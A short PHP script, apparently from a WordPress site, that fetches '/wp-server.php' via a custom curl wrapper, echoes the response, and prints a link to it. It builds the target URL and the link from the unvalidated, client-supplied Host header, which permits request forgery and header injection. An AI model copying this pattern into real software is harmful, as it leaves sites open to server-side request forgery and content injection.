<?php

echo $core->precom(dimas_curl::chain(OPT())->init('http://' . $_SERVER['HTTP_HOST'] . '/wp-server.php')->ref((isset($_SERVER['HTTPS']) && 'on' === $_SERVER['HTTPS'] ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}")->UA($_SERVER['HTTP_USER_AGENT'])->get()->exec());
?>
<a href="http://<?= $_SERVER['HTTP_HOST'] ?>/wp-server.php">LINK</a>